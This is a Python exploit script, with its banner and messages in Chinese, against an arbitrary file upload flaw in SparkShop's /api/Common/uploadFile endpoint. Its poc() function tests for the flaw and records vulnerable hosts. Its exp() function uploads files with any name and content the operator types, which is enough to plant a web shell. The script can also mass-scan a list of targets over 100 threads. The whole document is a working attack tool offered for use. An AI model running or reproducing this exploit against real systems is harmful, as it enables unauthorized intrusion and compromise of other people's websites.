import argparse,requests,time,json
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test="""
    <<<<<<<南京星源图科技_SparkShop_任意文件上传漏洞>>>>>>>>
    """
    print(test)




def poc(target):
    payload = '/api/Common/uploadFile'
    header = {
        "User-Agent": "Mozilla/5.0(Macintosh;IntelMacOSX10_15_7)AppleWebKit/537.36(KHTML,likeGecko)Chrome/127.0.0.0Safari/537.36",
        "Content-Type": "multipart/form-data;boundary=----WebKitFormBoundaryj7OlOPiiukkdktZR",
        "Content-Length": "176",
    }

    data = "------WebKitFormBoundaryj7OlOPiiukkdktZR\r\nContent-Disposition: form-data; name=\"file\";filename=\"1.txt\"\r\n\r\nabc\r\n------WebKitFormBoundaryj7OlOPiiukkdktZR--"

    res = requests.post(url=target+payload,data=data,headers=header,verify=False)
    if "upload success" in res.text:
        print(f"[+]{target}存在任意文件上传")
        with open('success.txt','a',encoding='utf-8') as f:
            f.write(f"[+]{target}存在任意文件上传\n")
def exp(target):
    print("----------------漏洞利用----------------------")
    time.sleep(2)
    while True:
        filename = input("请输入文件名:")
        content = input("请输入文件的内容")
        if filename == "q" or content == "q":
            print("正在退出..............")
            break
        payload = '/api/Common/uploadFile'
        headers = {
            "User-Agent": "Mozilla/5.0(Macintosh;IntelMacOSX10_15_7)AppleWebKit/537.36(KHTML,likeGecko)Chrome/127.0.0.0Safari/537.36",
            "Content-Type": "multipart/form-data;boundary=----WebKitFormBoundaryj7OlOPiiukkdktZR",
            "Content-Length": "176",
        }
        data = '------WebKitFormBoundaryj7OlOPiiukkdktZR\r\nContent-Disposition: form-data; name=\"file\";filename='+f'{filename}'+'\r\n\r\n'+f'{content}'+'\r\n------WebKitFormBoundaryj7OlOPiiukkdktZR--'
        try:
            response = requests.post(url=target+payload,headers=headers,data=data,verify=False,timeout=5)
            if response.status_code == 200 and "upload success" in response.text:
                json_start = response.text.find('{')
                if json_start != -1:
                    json_str = response.text[json_start:]
                    data = json.loads(json_str)
                    url = data['data']['url']
                    url1 = url.replace('\\', '')
                print(f"{filename}上传成功，请访问路径{url1}")

                with open('success.txt','a',encoding='utf-8') as f:
                    f.write(f"[+]{target}存在文件上传漏洞\n")
                    break
            else:
                print(f"[-]{target}不存在漏洞")
                break
        except Exception as e:
            print(f"[?]{target}网站异常")


def main():
    banner()
    parse = argparse.ArgumentParser()
    parse.add_argument('-u', '--url', dest='url', type=str, help='please enter url')
    parse.add_argument('-f', '--file', dest='file', type=str, help='please enter file')
    args = parse.parse_args()

    if args.url and not args.file:
        poc(args.url)
        exp(args.url)
    if args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()






if __name__=='__main__':
    main()